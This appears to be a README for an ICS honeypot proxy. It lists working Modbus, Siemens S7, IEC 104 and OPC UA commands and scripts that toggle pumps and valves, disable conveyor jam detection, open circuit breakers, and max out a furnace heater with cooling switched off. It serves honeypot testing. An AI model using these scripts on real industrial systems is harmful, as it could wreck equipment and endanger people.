# ICS Honeypot Proxy

## Modbus

### Activate the pump

```bash
modpoll -m tcp -a 1 -r 1 -c 1 -t 0 127.0.0.1 1
```

### Deactivate the pump

```bash
modpoll -m tcp -a 1 -r 1 -c 1 -t 0 127.0.0.1 0
```

### Activate the valve

```bash
modpoll -m tcp -a 1 -r 2 -c 1 -t 0 127.0.0.1 1
```

### Deactivate the valve

```bash
modpoll -m tcp -a 1 -r 2 -c 1 -t 0 127.0.0.1 0
```

## Siemens S7

### Changing the values of the conveyor belt

```python
import snap7
import struct
import time

PLC_IP = "127.0.0.1"
DB = 1

client = snap7.client.Client()
client.connect(PLC_IP, 0, 1)

# Change speed
new_speed_value = 0
payload = struct.pack(">f", new_speed_value)
client.db_write(DB, 0, payload)

# Disable jam detection
client.db_write(DB, 9, b'\x00')

```

## IEC 60870-5-104

### Changing the state of a circuit breaker

```python
import socket

ip = "127.0.0.1" # enter here the ip of the server

TARGET = (ip, 2404)

s = socket.create_connection(TARGET)

# STARTDT
s.send(b"\x68\x04\x07\x00\x00\x00")

# OPEN breaker 1
s.send(
    b"\x68\x0f\x00\x00\x00\x00\x2d\x01\x06\x00\x01\x00\x64\x00\x00\x00"
)

# OPEN breaker 2
s.send(
    b"\x68\x0f\x00\x00\x00\x00\x2d\x01\x06\x00\x01\x00\x65\x00\x00\x00"
)


# CLOSE breaker 1
s.send(
    b"\x68\x0f\x00\x00\x00\x00\x2d\x01\x06\x00\x01\x00\x64\x00\x00\x01"
)

# CLOSE breaker 2
s.send(
    b"\x68\x0f\x00\x00\x00\x00\x2d\x01\x06\x00\x01\x00\x65\x00\x00\x01"
)

s.close()

```

## OPC UA

### Changing the values/states of the Furnace

```python
from opcua import Client

server_ip = "127.0.0.1"

client = Client("opc.tcp://"+server_ip+":4840")
client.connect()

root = client.get_root_node()
objects = root.get_child(["0:Objects"])
furnace = objects.get_child(["2:FurnaceSystem"])

heater = furnace.get_child(["2:HeaterPower"])
cooling = furnace.get_child(["2:CoolingEnabled"])
mass = furnace.get_child(["2:LoadMass"])

# Attack
heater.set_value(100.0)
cooling.set_value(False)   # New values
mass.set_value(50.0)

client.disconnect()

```
